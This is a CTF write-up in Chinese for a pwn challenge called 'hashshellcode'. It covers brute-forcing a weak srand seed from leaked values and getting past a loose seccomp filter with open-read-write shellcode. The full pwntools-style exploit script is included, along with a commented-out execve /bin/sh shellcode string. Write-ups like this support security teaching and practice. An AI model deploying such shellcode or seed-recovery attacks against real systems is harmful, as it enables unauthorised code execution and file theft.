# hashshellcode

很简单的shellcode，怎么没人做（烦），想给选手堆点工作量就搞了点不随机的随机数，弄了个很小的随机数种子，用给出的几个随机数硬爆随机数种子就行。shellcode就是禁用了一堆然后你发现其实根本没用，正常打orw然后把read换成readv就行，限制放太宽了，应该把orw其中一个完全禁了的，或者加字符限制的check。

```python
from Excalibur2 import *
import ctypes

default('m')
proc('./hashshellcode')
remo('127.0.0.1:38703')

ru('some hints:')
data = (ru("Now").replace(b'\n',b'')).decode().split(' ')[1]
print(data)
data = [int(num) for num in data.split(',')]
print(data)
pause()
libc = ctypes.CDLL("libc.so.6")

libc.srand.argtypes = [ctypes.c_uint]
result = []
i=0
while True:
    libc.srand(i)
    # print(i)
    for j in range(20):
        result.append(libc.rand()%1000)
    is_match = all(x == y for x, y in zip(data, result))
    if is_match:
        print("seed:",i)
        flag = libc.rand()%1000
        print("next randnumber:",flag)
        break
    else:
        result = []
    i+=1


pause()
sla(b"it's his",str(flag))

#shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'


shellcode ='''
nop
nop
push 0x67616c66
mov rdi, rsp
xor rdx, rdx
xor rsi, rsi
push 0x2
pop rax
syscall
'''
#shellcraft.open("flag")
shellcode += '''
push 0x11
pop rax
push 0x3
pop rdi
push 0x64
pop rdx
push 0x0
pop r10
push rsp
pop rsi
syscall
'''
shellcode += shellcraft.write(1,'rsp', 100)

shellcode = asm(shellcode)



pay = shellcode
print(len(pay))



sla(b'flag',pay)

ia()


```
